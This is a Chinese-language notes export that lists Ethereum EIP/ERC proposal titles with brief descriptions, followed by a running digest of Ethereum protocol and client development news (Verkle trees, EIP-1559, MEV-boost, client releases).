合约跟踪数据标准\n\n\nLast call：ERC1363 可支付 Token 进入最后征求意见阶段\n\n\nLast call：EIP1193 Eth provider Javascript API 进入最后征求意见阶段\n\n\nERC 2612：ERC-20 标准的 permit 函数延伸\n\n\nEIP2357：用 Total difficult 字段替代区块头中的 difficult 字段\n\n\nERC2665：ERC721 转移手续费插件\n\n\nEIP2666：重定价预编译和 Keccak256 函数\n\n\nERC2680：eth2 标准钱包布局和命名模式\n\n\nERC2678：EthPM v3\n\n\nEIP2681：限制账户的 nonce 上限为 2^64 -1\n\n\nEIP2677：限制 initcode 的规模\n\n\nERC2876：保证金合约和地址标准\n\n\nEIP 的提出流程变更：将 “弃置” 重命名为 “撤回” 并取消实现作为核心要求\n\n\nEIP2926：基于 Chunk 的代码默克尔化\n\n\nEIP2929：提高状态读取操作码的 Gas 消耗\n\n\nEIP2930：可选的访问列表\n\n\nEIP2935：在状态中保存历史区块哈希值\n\n\nEIP2936：为 SELFDESTRUCT 后的合约提供 EXTCLEAR 操作码\n\n\nEIP2937：SET_INDESTRUCTIBLE 操作码\n\n\nEIP2938：账户抽象（评估账户抽象的 DoS 攻击面）\n\n\nERC2942：EthPM URI 详述\n\n\nEIP2970：IS_STATIC 操作码\n\n\nEIP2976：Gossip 上传输的标准化交易\n\n\nERC2980：符合瑞士资产法规的 ERC20 代币\n\n\nERC2981：ERC721 Royalty Standard\n\n\nEIP2982：eth2 phase 0\n\n\nEIP3074：捐献曲线预编译\n\n\nERC3076：验证者客户端交互标准\n\n\nEIP3068：BN256 哈希成曲线算法预编译\n\n\nEIP3102：二进制状态树的结构\n\n\nEIP3091：区块浏览器的 API 路由\n\n\nEhrsam：治理机制最小化\n\n\nMintable 使用 NFT 治理型 DAO 来防范闪电贷攻击\n\n\nEIP3155：EVM 跟踪规范\n\n\nERC3156：闪电贷\n\n\n来自 1559 Besu 客户端性能测试的数据\n\n\n支持/反对 EIP-1559 提案的矿池完整列表\n\n\n支持/反对 1559 提案的项目列表\n\n\nHasu &amp; Georgios：矿工会接受 EIP-1559，因为别的选择更糟\n\n\nLeonardos, Monnot, et al：1559 basefee 机制的动态分析\n\n\n长推特总结 1559 社区会议上的观点\n\n\nERC3085：钱包加入以太坊区块链 RPC 方法（‘wallet_addEthereumChain’)， MetaMask 已经实现085\n\n\nEIP3322：账户 gas 存储操作码\n\n\nEIP3332：MEDGASPRICE 操作码\n\n\nERC3338：限制账户的 nonce 上限为 2\n\n\nEIP3336：EVM 的分页内存分配\n\n\nEIP3337：帧指针支持内存加载和存储操作\n\n\nERC3345：连环调用标准\n\n\nERC3361：签名以太坊消息的\n\n\nEIP3369：少量修改 Ethash 算法、打破当下的 ASIC 实现\n\n\nEIP3368：提高区块奖励\n\n\nEIP3382：硬编码区块 Gas 上限\n\n\nEIP3404：修改 SSTORE 和 SLOAD 的 Gas 开销以及退款机制\n\n\nEIP3403：除了将 SSTORE 值改为 0 以外一律取消 Gas 退款\n\n\nEIP3416：旨在于 1559 相竞争的加权中值溢价方案\n\n\nEIP3436：为 Clique 添加规则来减少出块过程中的僵局\n\n\nEIP3416：旨在于 1559 相竞争的加权中值溢价方案\n\n\nEIP3436：为 Clique 添加规则来减少出块过程中的僵局\n\n\nEIP3447：新的事务参数，指定事务可上链的区块号范围\n\n\nEIP3448：MetaProxy Factory 标准\n\n\nEIP3450：Shamir + BIP-39\n\n\nERC3473：多个可调用定金的合约标准\n\n\nERC3476：表示债务的 token\n\n\nEIP3508：事务数据操作码\n\n\nERC3440：NFT 编辑标准\n\n\nEIP3520：事务目的地操作码\n\n\nEIP3529：移除 SELFDESTRUCT 的 Gas 返还，减少 SSTORE 的返还，并加入每笔事务的最大返还额为已使用 gas 数量的 20%\n\n\nEIP3521：降低访问清单的代价\n\n\nEIP3540：以太坊对象格式\n\n\nEIP3541：拒绝以 0xEF 字节开头的新合约（迈向 3540 的一步）\n\n\nEIP3534：受限的链语境类型事务\n\n\nERC3525：通用的 NFT\n\n\nERC3549：Anti-sleepminting ERC721 Metadata sig\n\n\nERC3569：密封的 NFT 元数据\n\n\nERC3561：信任最小化的可升级代理合约\n\n\nEIP3584：区块的访问清单\n\n\nEIP3601：带有版税分配系统的可分割 NFT\n\n\nEIP3607：拒绝部署有代码的发送者的事务\n\n\nProto-EIP：用于 Verkle 树的 witness gas 开销\n\n\nProto-EIP：状态过期\n\n\nEIP3651：COINBASE 预热\n\n\nEIP3675：将共识机制升级到权益证明\n\n\nEIP3668：为脱链的数据检索提供安全性\n\n\nEIP3712 多类型可替代代币标准\n\n\nEIP3722：Poster\n\n\nEIP3772: 整数压缩\n\n\nEIP3770: 特定链的地址\n\n\nEIP3756: Gas Limit 限制\n\n\nEIP3754: 普通的非同质代币标准\n\n\nEIP3742: 多方参与代币合约标准\n\n\nEIP3788：严格强制执行链 ID\n\n\nEIP3779：EVM 的安全控制流程\n\n\nEIP3855：PUSH0 指令\n\n\nEIP3860：限制和度量 initcode\n\n\nEIP3978：revert 的 Gas 返还\n\n\nEIP4200：静态的相对调用\n\n\nEIP4337：通过端点合约规范实现账户抽象\n\n\nEIP4396：感知时间的 Base Fee 计算机制\n\n\nEIP4399：以 RANDOM 操作码替代 DIFFICULTY 操作码\n\n\nEIP4521:兼容ERC721/20\n\n\nEIP4546:包装存储资金\n\n\nEIP4573:EVM 代码部分的切入点和程序\n\n\nEIP4610: ERC721 委托人扩展\n\n\nEIP4635: 半可替代token标准\n\n\nEIP4626: 收益型金库代币化标准。\n\n\nEIP4393: NFT 和多 Token 的微支付标准EIP4671：不可交易的代币标准\n\n\nEIP4636：许可Token发布标准\n\n\nEIP4341：有序批量 NFT 标准\n\n\nEIP4675: 可拆分 NFT 标准\n\n\nEIP4721: 交易过期\n\n\nEIP4762: 无状态 gas 消耗改变\n\n\nEIP4760: SELFDESTRUCT 炸弹\n\n\nEIP4758: 停用 SELFDESTRUCT\n\n\nEIP4750: EOF 函数\n\n\nEIP4747: 简化 EIP 161\n\n\nEIP4736: 共识层取款保护\n\n\nEIP4788: EVM 中的信标状态根(root)\n\n\nEIP4786: 将通用 Token 链接到 ERC721\n\n\nEIP4742: NONCE 操作码\n\n\nEIP4824: 去中心化自治组织\n\n\nEIP4812: Exodus\n\n\nEIP4803: 限制交易gas不超过2\n\n\nEIP4800: NFT包装标准\n\n\nEIP4841: 可扩展的链上SVG图像存储结构\n\n\nEIP4399: 用PREVRANDAO代替DIFFICULTY操作码\n\n\nEIP4844: Shard Blob Transactions，以一种简单的、向前兼容的方式扩展以太坊数据可用性。\n\n\nEIP4881: 存款合约Snapshot接口\n\n\nEIP4885: 为NFT和多代币订阅代币标准\n\n\nEIP4886: 代理所有权注册用户\n\n\nEIP4895: 支持验证器通过一个新的“系统级”操作类型从信标链“push”到EVM的验证器取款。\n\n\nEIP4906: ERC721/ERC1155 元数据更新扩展\n\n\nEIP4907: ERC721 用户和有效期扩展\n\n\nEIP4910: Royalty Bearing NFTs\n\n\nEIP4944: 一个erc721兼容的single-token NFT\n\n\nEIP4950: 一个erc721兼容的标准，只有两个绑定在一起的token\n\n\nEIP4955: NFT 元数据标准扩展\n\n\nEIP4962: 将DEST操作添加到EVM中\n\n\nEIP4974: (EXP) 代币标准\n\n\nEIP4972: 拥有的社会身份帐户\n\n\nEIP4966: 不可转让的 NFT 标准接口，也称为“灵魂绑定代币”(简称“SBT”)。\n\n\nERC721R: 铸币者可以退回 NFT 并取回退款\n\n\nEIP5008: ERC721 Nonce 和元数据更新扩展\n\n\nEIP5007: 为ERC-721代币添加开始时间和结束时间。\n\n\nEIP5005: Zodiac\n\n\nEIP5003: 用 AUTHUSURP 替换 EOA\n\n\nEIP4985: GameFi 的 NFT，以太坊上特定于GameFi的NFT提案。\n\n\nEIP4897: 持有代币标准，查询所持有代币的所有权和余额的标准接口\n\n\nEIP4804: 将http样式的Web3 URL转换为EVM调用消息\n\n\nEIP5023: 可共享不可转让的 NFT\n\n\nEIP5022: 将 SSTORE 的价格从零增加到 40k gas\n\n\nEIP5018: 目录标准\n\n\nEIP5006: ERC1155 使用权限扩展\n\n\nEIP4931: 通用代币升级标准\n\n\nEIP5058：可锁定的 ERC721 标准\n\n\nEIP5027：取消合约代码大小限制\n\n\n关于从 EIP 中拆分 ERC 的讨论\n\n\nEIP5075: rateLimit – 在给定的时间范围内，将所有合约资产的流出限制在给定的比率内\n\n\nEIP5069: EIP编辑手册\n\n\nEIP5065: 以太币转移说明(只传输以太币而不传输执行流程)\n\n\nEIP5058: 可锁定的 ERC721 代币\n\n\nEIP5050: 代币交互标准\n\n\n关于以 NFT 的形式一次性出售未使用的 EIP 编号的提案\n\n\nEIP5089: 本金代币(零息代币)标准，在未来的一个时间戳中，可兑换为一个基础ERC-20代币，表示未来时间戳上的基础ERC-20令牌的所有权。\n\n\nEIP5083: NFT 的代币接受标准，允许 ERC20 代币用于在 NFT 市场中买卖 NFT\n\n\nEIP5081: 过期交易，添加新的交易类型包含过期区块编号\n\n\nEIP4353: 质押 NFT 的接口\n\n\nEIP5107:绑定名称的代币\n\n\nEIP5143: 扩展了ERC-4626，增加了用于在价格发生滑动时确保EOA和保险库之间安全交互的函数。\n\n\nEIP5139: 指定了一个JSON模式来描述类以太坊链的远程过程调用(RPC)提供者列表\n\n\nERC4626 代币化保险库标准推广网站\n\n\nEIP5164: 定义了一个支持跨 EVM 网络执行的接口。\n\n\nEIP5163: 一个dapp协议，向可能与某合约交互的钱包建议元数据\n\n\nEIP5169:代币合约的客户端脚本URI\n\n\nEIP5170: 为代币合约断言客户端脚本可靠性\n\n\nEIP5173: NFT未来奖励——一个奖励‌所有‌NFT所有者的多代奖励机制\n\n\nEIP5185: NFT 可更新元数据扩展\n\n\nEIP5187: 扩展 ERC1155 ， 提供可出租使用权\n\n\nEIP5189: 通过背书操作（Endorsed Operations）抽象账户\n\n\nEIP5192: 最小的灵魂绑定 NFT\n\n\nEIP5202: 工厂合约格式\n\n\nEIP5216: 定义了ERC-1155批准数量的标准函数，依赖并扩展了现有的ERC-1155。\n\n\nEIP5218: NFT 权限管理\n\n\nEIP5219: 去中心化 HTTP\n\n\nEIP5247: 智能提案\n\n\nEIP5252: 去中心化金融的智能合约设计模式，eip-5114的扩展\n\n\nEIP5267: 检索 EIP712 域EIP4883: 可组合的 SVG NFT\n\n\nEIP5269: ERC 接口检测\n\n\nEIP5289: 公证接口，让智能合约在链下具有法律约束力\n\n\nEIP5313: 轻合约所有权\n\n\n关于EIP 编号应该怎样选择的讨论\n\n\nEIP5320: 兼容 NFT 的 Harberger tax 接口\n\n\nEIP5341: 定义NFT推荐程序的标准接口。\n\n\nEIP5344: 灵魂绑定代币，它有一个固定的地址列表，共同拥有代币。\n\n\nEIP4987: 持有代币接口\n\n\nEIP5283: 用于重入保护的信号量\n\n\nEIP5375: NFT 作者信息和同意书\n\n\nEIP5380: ERC721 使用权扩展\n\n\nEIP5409: ERC1155 NFT 扩展\n\n\nEIP5299: 动态存储槽扩容模式\n\n\nEIP5345: Walletconnect 静默签名（silent-signing）扩展\n\n\nEIP5437: 安全合约接口EIP5298: ENS 作为代币持有者\n\n\nEIP5299: 动态存储槽扩容模式\n\n\nEIP5334: ERC721 用户、有效期 、等级扩展\n\n\nEIP5450: EOF – 栈验证\n\n\nEIP5453: 合约加密背书\n\n\nEIP5478: 用现有代码降低创建合约的 gas 成本\n\n\nEIP5484: 可共识的灵魂绑定代币\n\n\nEIP5485: 合法性、管辖权和主权\n\n\nEIP5489: NFT 超链接扩展\n\n\nEIP5496: ERC721 的多权限管理扩展\n\n\nEIP5501: 租赁和委托 NFT – ERC721 扩展\n\n\nEIP5503: 可退款代币\n\n\nEIP5507: 可退款的 NFTEIP5298: ENS 作为代币持有者\n\n\nEIP5299: 动态存储槽扩容模式\n\n\nEIP5334: ERC721 用户、有效期 、等级扩展\n\n\nEIP5450: EOF – 栈验证\n\n\nEIP5453: 合约加密背书\n\n\nEIP5478: 用现有代码降低创建合约的 gas 成本\n\n\nEIP5484: 可共识的灵魂绑定代币\n\n\nEIP5485: 合法性、管辖权和主权\n\n\nEIP5489: NFT 超链接扩展\n\n\nEIP5496: ERC721 的多权限管理扩展\n\n\nEIP5501: 租赁和委托 NFT – ERC721 扩展\n\n\nEIP5503: 可退款代币\n\n\nEIP5507: 可退款的 NFTEIP5505：ERC1155 资产支持的 NFT 扩展\n\n\nEIP5516：灵魂绑定多方拥有代币\n\n\nEIP5521：NFT间的引用关系\n\n\nEIP5528：可退款代币标准EIP5539：从注册表撤销\n\n\nEIP5548：NFT 操作者授权控制\n\n\nEIP5553：代表知识产权及其版权结构\n\n\nEIP5554：NFT 合法使用、共享、再利用和混合\n\n\nEIP5559：跨链写延迟协议\n\n\nEIP5560：可赎回的 NFT\n\n\nEIP5564：隐形地址钱包\n\n\nEIP5568：revert 信号\n\n\nEIP5570：数字收据 NFT\n\n\nEIP5573：用以太坊登录\n\n\nEIP5585：ERC721 NFT 授权\n\n\nEIP5593：防止 web3 提供者（provider）对象 API 注入过多资金\n\n\nEIP5604：NFT 留置权\n\n\nEIP5606：代理 NFT\n\n\nEIP5615 : 从EIP-1155获取代币供应数据的简单机制\n\n\nEIP5625：NFT 元数据 JSON 模式 dStorage 扩展\n\n\nEIP5601：可扩展模式\n\n\nEIP5617：不可转让的代币\n\n\nEIP5630：加密/解密的新方法\n\n\nEIP5633：可组合的灵魂绑定 NFT，ERC1155 扩展\n\n\nEIP5635：NFT 许可协议\n\n\nEIP5639：委托注册表\n\n\nEIP5643：订阅 NFT\n\n\nEIP5646：代币状态指纹\n\n\nEIP5656：内存复制指令EIP5659：社交媒体 URI 传播事件\n\n\nEIP5679：代币铸造和销毁\n\n\nEIP5700：可绑定代币\n\n\nEIP5719: 签名替换接口\n\n\nEIP5725: 可转让所有权 NFT\n\n\nEIP5727: 半灵魂绑定代币\n\n\nEIP5732: 简单提交接口\n\n\nEIP5744: 潜在的可替代的代币\n\n\nEIP5748: 有批准期限的ERC20 代币\n\n\nEIP5749: window.evmproviders 对象\n\n\nEIP5750: 方法中的额外数据参数\n\n\nEIP5753: ERC721可锁定扩展\n\n\nEIP5757: 外部资源审批流程Ethereum Cat Herders Learn-2-Earn: 完成 EIP 测试获得 POAP\n\n\nERCRef: ERC实现的存储库\n\n\nEIP5773: Multi-resource Token（多资源 Token）\n\n\nEIP 创建指南\n\n\nEIP5883:通过社交恢复转移代币\n\n\nEIP5896: 可拒收 NFT\n\n\nEIP5902: 合约事件hooks\n\n\nEIP5920：PAY 支付操作码\n\n\nEIP5976：EIP 作者手册\n\n\nEIP5982：基于角色的访问控制\n\n\nEIP5987 : 基于授权（authorization）的无权限（Permissionless）交易\n\n\nEIP5988：添加预编译 Poseidon 哈希函数\n\n\nEIP5994 : Token Pods 扩展 (ERC20/ERC721)\n\n\nEIP6036：可订阅的 NFT 扩展\n\n\nEIP6046：将 SELFDESTRUCT 替换为 DEACTIVATE\n\n\nEIP6047：通过 ERC721 事件计算余额\n\n\nEIP6049：弃用 SELFDESTRUCT\n\n\nEIP6051 : 私钥封装\n\n\nEIP6059：父母管理的可嵌套 NFT\n\n\nEIP6065 : 不动产代币\n\n\nEIP6066：NFT 的签名验证方法\n\n\nEIP6077：由 ERC712 支持的基于签名的操作的无效抽象\n\n\nEIP6093：ERC 代币的自定义错误\n\n\nEIP6105：ERC721 的市场扩展\n\n\nEIP6110：在链上供应验证者存款\n\n\nEIP6120 : 通用代币路由\n\n\nEIP6122：基于时间戳的 Forkid 检查\n\n\nEIP6123 : 智能衍生合约\n\n\nEIP6145 : Hashtag NFT 集合 版税金库\n\n\nEIP6147：定义了NFT/SBT的新管理角色’guard’，实现了NFT/SBT的转让权和持有权的分离。NFT/SBT 的守卫，ERC721的扩展。\n\n\nEIP6150：分层 NFT\n\n\nEIP6170: 跨链信息接口\n\n\nEIP6188: Nonce cap（最大值）\n\n\nEIP6189: 别名合约（指向其他合约的合约）\n\n\nEIP6190: 实用的 SELFDESTRUCT（仅在有限状态变化的情况下可触发）\n\n\nEIP6206: EOF – JUMPF 新指令\n\n\nEIP6220：利用可装备部件的可组合 NFT\n\n\nEIP6224：合约注册依赖注入机制\n\n\nEIP6228：Extreme ЕRС20，元交易代币（MTT）\n\n\nEIP6229：有锁定期的代币化保险库\n\n\nEIP6239：语义灵魂绑定代币EIP6212：链上可购买的 NFT 代币和版税\n\n\nEIP6268 : ERC1155 不可转移的指示\n\n\nEIP6269：标准化定义完全 EVM 等效（ Full EVM Equivalence）\n\n\nERC6150：分层 NFT\n\n\nERC6299：可锁定代币\n\n\nERC6315 : ERC2771 账户抽象\n\n\nERC6327 : 弹性签名\n\n\nERC6353 : 慈善代币\n\n\nERC6357：允许EOA在一次交易中调用智能合约的多个函数\n\n\nERC6358 : 全能分布式账本技术\n\n\nERC6366：权限代币\n\n\nERC6372：合约时钟\n\n\nERC6381： NFT 的扩展，可以用 Unicode 表情符号\n\n\nEIP6384：人类可读的离线签名\n\n\nTim Beiko 提议从 EIP 库中分叉 ERC\n\n\nEIP6404：SSZ 交易、收据和取款\n\n\nERC6160：多链代币\n\n\nEIP：\n\nEIP6465：SSZ 提款根\nEIP6466：SSZ 交易根\nEIP6475：SSZ 可选项\n\n\n\nERC：\n\nERC6454 : 极简的不可转让NFT\nERC6464：EIP-721扩展，允许代币所有者批准多个操作者在每个代币的基础上控制其资产。\nERC6492：预部署合约的签名验证\n[复活] ERC223 : 有事件处理和通信模型的代币\n\n\n\nERC：\n\nERC6498：在合约上文件签署\nERC6506：P2P 托管治理激励\n\n\n\n新的EIP 核心和 ERC 编辑员\n\n\nERC：\n\nERC6538：隐形元地址注册表\nERC6551 : NFT 绑定账户\n\n\n\nERC6596：历史资产元数据 JSON 模式\n\n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/ETH更新":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/ETH更新","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/ETH更新.md","title":"ETH更新","links":[],"tags":[],"content":"\n\n用 DHT+SkipGraph 解决链和状态数据检索问题\n\n\nVitalik 写的 EIP1559 （手续费机制变更）FAQ\n\n\nPéter Szilágyi 的 snap sync 模式详述；snap 对比 fast sync 的基准测试结果\n\n\nphase 0 spec v0.12：加入了最新的 IETF 标准。这一版的 spec 就是 Eth2 Phase 0 启动时会用到的最终规范\n\n\nLighthouse 客户端更新：BLS 签名实现，已经过 Trail of Bits 审计，可使用 300MB 内存运行 2000 个验证者\n\n\n用 Solidity 案例来解释 EIP2938 账户抽象\n\n\nPiper 撰写的 “状态可得性” 文档\n\n\n持久化储存 txpool 提案\n\n\n彻底改变无状态以太坊的路线图\n\n\n另一种对打包状态友好的地址方案\n\n\n以太坊状态管理诸提议\n\n\n使用 Verkle tries 管理以太坊状态\n\n\n一个可应用于不定型树状哈希数据结构的存储槽租金方案\n\n\n促进状态可得性的 GetNodeData DHT 方法\n\n\n应用于轻客户端的事务 gossip 网络\n\n\nVitalik 和 Micah 提议了一种另类的状态收缩方法，一种以一年为长度的 regenesis\n\n\n将地址长度从 20 字节延长到 32 字节的提议\n\n\n弱无状态性 以及/或者 状态过期方案 即将到来\n\n\n为什么我们应该把 verkle trees 和定期的状态灭活方案结合起来\n\n\n通过 Flashbots 实现账户抽象？\n\n\n提议将以太坊的状态树格式改为 verkle tree\n\n\n状态检索网络的一个初步规范\n\n\n提议将以太坊的状态树格式改为 verkle tree\n\n\n状态检索网络的一个初步规范\n\n\n启用 BLS12-381 支持的路径：EIP2537 和 EVM384\n\n\nEVM384 进展：基准测试和预编译\n\n\n提议使用 GASMETER 操作码来移除 GAS 操作码\n\n\n让 eip1559 更像一条 AMM 曲线（这是未来的目标，不会放在伦敦升级中）\n\n\n无状态以太坊路线图更新\n\n\n无状态以太坊创意：插入顺序索引型默克尔树 以及 见证数据生成的贝叶斯网络模型\n\n\n状态存储和执行应该有相互独立的定价吗？为什么我们需要提高状态访问的 gas 开销？\n\n\nFuzzyVM：一种 EVM 模糊测试框架\n\n\n切换到 Verkle 树之后的 witness gas 消耗量设计提案\n\n\n为什么要给状态访问操作码提高 Gas 消耗量\n\n\n给钱包开发者和用户的 EIP1559 说明\n\n\n“伦敦” 分叉测试网 Baikal 现已在区块浏览器上显示 EIP-1559 交易数据\n\n\nBeiko 的核心开发者系列更新\n\n\nTurbo-Geth 项目重命名为 Erigon，还计划将 C++ 和 Rust 语言实现的客户端分别命名为 Silkworm 和 Akula\n\n\nVitalik：粉尘账户清理办法\n\n\nGeth 的默认同步模式从快速同步切换为快照同步（11 小时 vs. 2 小时）\n\n\n“伦敦” 升级的开发者网络命名为 “Calaveras”，修复了 Martin Swendo 发现的一些问题\n\n\n分析为见证数据的每个代码片收取 350 Gas 的效能\n\n\n使用 verkle tree 的 Geth 概念验证开发者网络\n\n\nVitalik 提议使用单层的 Verkle 树（而不是当前提议的、在树结构中安排双层树的做法）\n\n\n提议使用预编译来抽象历史和分片证据的验证方法，以允许未来更改格式\n\n\n提议使用另类的交易池（比如 Flashbots）来实现账户抽象\n\n\nPiper 提议使用一个可执行的 markdown 格式规范来替代晦涩的黄皮书\n\n\n状态过期会议解读了 Vitalik 的状态过期和无状态性路线图：每年一次状态过期、仅要求区块生产者存储状态，其它节点可以是无状态的\n\n\nVitalik 解释 Verkle tree：Verkle tree 使得证明可以小于 150 字节，使无状态客户端成为可行\n\n\nTrin （Rust 语言的 portal network 客户端）更新：全功能的 JSON RPC 轻客户端，正在与其他客户端沟通，下一步是传输数据\n\n\nEIP3074 的替代方案以及批评\n\n\n解释 EVM 的对象格式\n\n\n分析合约中的 memory 复制，以及使用 MCOPY 操作码的提议\n\n\n使用 EVM 对象格式实现账户抽象\n\n\n（状态保质期方案）使用带前缀的地址时期替代当前的延长地址（从 20 字节延长到 32 字节）方案\n\n\nVitalik 的 无状态性、沃克尔树和状态保质期 AMA\n\n\nSELFDESTRUCT 在沃克尔树方案（已移除大部分的自毁功能）下效果的初步分析\n\n\n使用 EIP3074，将 EOA 迁移到基于验证的智能合约钱包\nSpreadsheet 展示 EIP1559 机制下 baseFeePerGas 的波动速度\n\n\nevmodin：Rust 语言的 EVM 实现，使用 evmone（C++ 语言） 作为接口\n\n\n使用桥合约的地址空间拓展（ASE），作为使用转换映射的 ASE 的替代\n\n\n提议使用一套覆盖层协议来建立和管理一个可使用任意数量子协议的覆盖网络\n\n\n链历史存储网络首个规范草案：提供历史区块头和区块体的按需获取\n\n\n状态网络的存储格式提议\n\n\n提议使用 EEICALL 操作码以在给定的执行环境接口下执行字节码\n\n\nEIP3709：弃用类型 1 的交易（即 “伦敦” 分叉以前以太坊使用的交易格式）\n\n\nVerkle树的影响对现有合约的影响，~26%的平均gas增长\n\n\nGeth 正在考虑放弃对 archive nodes 的支持\n\n\n强化 BLS12-381 椭圆曲线\n\n\n验证者隐私消息分享协议，为了隐私性以及抵抗洪泛攻击\n\n\nGeth v1.0.9：修复了一些 bug，弃用 eth/65 联网协议\n\n\nEIP4361：使用以太坊账户来登录。项目网站：login.xyz\n\n\nEIP4363：交易索引操作码\n\n\n无状态以太坊资源表：沃克尔树开发进度、地址空间扩展以及状态网络\n\n\n请立即升级 Geth 客户端：v1.10.9 以前的版本披露了安全漏洞，可通过构造 p2p 消息发起 DoS 攻击\n\n\n关于精简默克尔树 gas 计算的提议\n\n\nGeth v1.10.15:解bug，点对点eth网络可以上锁\n\n\nBesu v21.10.6: 更新解决log4j的问题\n\n\n有些交易所仍然没有实现EIP1559类型2交易\n\n\nVitalik的多维EIP1559协议，从EVM执行，交易调用数据，存证数据和存储大小增长开始为每个资源创建突发限制\n\n\nEIP1559 使用分析: 费用估算限制更容易，区块间的 gas 价格波动减少，用户等待时间减少，MEV 在矿工收入的占比更大\n\n\nFlashbots 研究: 并行 EVM, 同时执行无存储冲突交易，通过可选的访问列表进行预加载存储\n\n\nErigon v2022.01.03: 改进了交易池中的分类，实验发行及销毁跟踪功能，bug修复。\n\n\n提议主网的 rollup gas 归入 layer2 消息\n\n\n执行层的执行规范预览版\n\n\n包含Verkle证明的样本区块 ，以及解码、验证这个区块的实用程序\n\n\nMini-danksharding 原型 (data-blob-transaction): 在ETHDenver共同开发, 下一步是开发网和EIP草案\n\n\n使用检查点同步的Nimbus迁移指南\n\n\nVouch v1.4.0 (多节点验证)增加支持Nimbus\n\n\nVitalik: 数据可用性抽样，可以用IPAs替换KZG吗\n\nKiln 测试网成功过渡到 POS ，存在一些问题，需要更多的测试，包括开发网和fork主网\nEIP4895 推送提现作为上海升级的选择\nEIP4844 数据blob交易类型更新\n核心 EIP 流程与可执行规范协调一致的提案\n\n\n\nErigon v2022.03.01: 修复漏洞\n\n\nBesu v22.1.2: 支持 Kiln v2.1 规范，跟踪 API 改进\n\n\nPluGeth Parity 跟踪插件: 4 种相当于 OpenEthereum 的追踪方法\n\n\nEIP4844 数据 blob 交易类型 meta-spec 和 推广网站\n\n\nDankrad 的 EIP1559 指数版本解释器, 针对数据blob 交易的提议\n\n\n如果在2TB SSD上运行，质押者应该修剪 Geth 节点\n\n\n关于账户的需求：将 EOA 迁移到合约钱包的选项\n\n\n\n关于 RPC 安全/不安全/最新标签的讨论\nMEV boost: validators/proposers to set gas limit rather than builders\nMEV 升级：验证者/提议者设置gas限制，而不是建设者\n\n\n\nErigon v2022.04.04-alpha：通过 BitTorrent 提高快照文件下载速度的解决方法\n\n\nVerkle 树迁移草图\n\n\nNiceNode：在 Linux、Mac 或 Windows 上运行 Geth 节点的 alpha 接口\n\n\nEIP4844 交易验证提速 (用 KZG 证明), 验证时间减少到 3.5ms\n\n\n了解 Verkle 树中的密码学: bandersnatch 和 banderwagon的区别\n\n\nMEV-boost 是一个新的中间件，在这个中间件中，验证者不仅可以向Flashbots出售他们的区块空间，还可以向其他构建者出售。这为更多的构建者打开了市场，并在他们之间创造了竞争，为验证者带来了更多的收入和选择。\n\n\n共识层客户端的\n性能测试\n\nTLDR: 对比了6个以太坊共识层客户端: Lighthouse, Lodestar, Nimbus, Prysm, Teku 和Grandine\n\n\n\n个人质押者的合并升级清单\n\n\n如果你觉得你的验证者被DOS攻击，那么运行一个岗哨节点直到以太坊发布单一秘密领导选举协议(SSLE)来修复问题\n\n\nConstantine BLS 实现，相比BLST，签名速度快 14% ，验证速度快 18%\n\n\n提议支持基于中间件的分布式验证客户端\n\n\nVitalik 关于调整内存 gas 成本的建议\n\n\nMEV-boost 信息网站\n\n\nObol的Athena公共测试网——分布式验证者中间件客户端\n\n\nTeku v22.8.0: MEV-boost 支持, libp2p 及 分叉选择优化\n\n\nPrysm v2.1.4-rc.1: 支持 Goerli 合并\n\n\nFlashbots 为MEV-boost构建了一个中继监视器和断路器，以防遭遇区块扣留攻击\n\n\n用阀值加密删除 MEV-boost 中的可信中继的提议\n\n\nview-merge代替 propose boost ，防御balancing &amp; ex-ante攻击\n\n\n抗审查列表（crList）提案，创建者被迫充分使用区块空间，否则他们必须在未使用的空间中包含提案人选择的交易\n\n\n共识层视频会议。来自Christine Kim的笔记，11 月 3 日下一次 CL 电话会议\n\n\nLodestar v1.1.0：稳定性改进，为每个验证者配置提案人元数据\n\n\nNimbus v22.9.1：修复了几个报告的问题和小的性能改进\n\n\nTeku v22.9.1：性能改进\n\n\n共识规范v1.2.0：主网 Bellatrix 规范、提款和 EIP4844 研发\n\n\nMEV订单流拍卖，以解决独家订单流\n\n\n具有对数同步时间的超轻客户端，假设连接到一个诚实的完整节点\n\n\n通过ERC4337 + EIP3074 + EIP5003 +交易包含列表实现帐户抽象\n\n\nEIP4844 (proto-danksharding):KZG的算术哈希替代方案是可能的，但需要进行很多权衡\n\n\nBesu v22.7.5: 修复空块提案和 RPC 缺陷\n\n\nErigon v2.27.0: 实验性嵌入式共识层客户端，更改为语义版本\n\n\nNethermind v1.14.3: 减少错过证明；及即将到来的新特性\n\n\n建议在 eth_getLogs 返回的日志中添加区块时间戳\n\n\n利用边缘执行成本估算gas成本的第二阶段研究成果\n\n\n通过限制构建者的权力来降低中心化风险，并通过部分块拍卖(包含列表或后提议者)最小化区块提议者的责任。\n\n\nMEV-Boost 开发过程讨论\n\n\nFlashbots 计划实现去中心化的区块构建\n\n\nJon Charbonneau: Flashbot 可以通过开源它们的生成器或添加一个上限来减少审查\n\n\nNimbus v22.10.0: 出块更快，增加了指标\n\n\nethStaker Goerli 测试网验证器押金更新为只需要 0.0001 GoETH\n\n\nPrysmatic Labs（Prysm 团队） 被 Offchain Labs（Arbitrum 团队） 收购\n\n\nMEV-Boost 发展理念\n\n\nMEV Watch 的US OFAC审查增加了最后100个区块的可视化\n\n\n轻客户端代理; 将钱包连到本地 RPC, 对最新的区块头使用证明来验证调用:\n\nNimbus 轻代理\nKevlar CLI 工具运行一个基于客户端的轻RPC代理，用 Lodestar API\n\n\n\nNimbus v22.10.1: 支持轻客户端 REST API ，提高使用外部块构建时的稳定性\n\n\nTeku v22.10.1: 修bug, 优化 ， voluntary-exit 命令改进\n\n\nBen Edgington 的升级以太坊电子书，带注释的 Bellatrix 版\n\n\nBarnabe: protocol-enforced proposer commitments (PEPC) 可能替代 PBS\n\n\nEIP4844（proto-danksharding）准备就绪的清单\n\n\nEVM Object Format (EOF) EIP 解释\n\n\n最新共识层\n\nMEV-Boost 更新：Flashbot不再是Top Builder\n取款：关于设置一个约束避免扫描整个验证者集的讨论\nEIP4844 blob 待验证，将在测试网上检查\n提议将 getCapabilities 添加到 Engine API 并改进规范结构\n\n\n\n共识规范v1.3.0-alpha.1：Capella 和 EIP4844 改进，为开发测试网做好准备\n\n\nFlashbot 区块构建器开源\n\n\nMEV-Boost 中继v0.14.0：修复 DoS 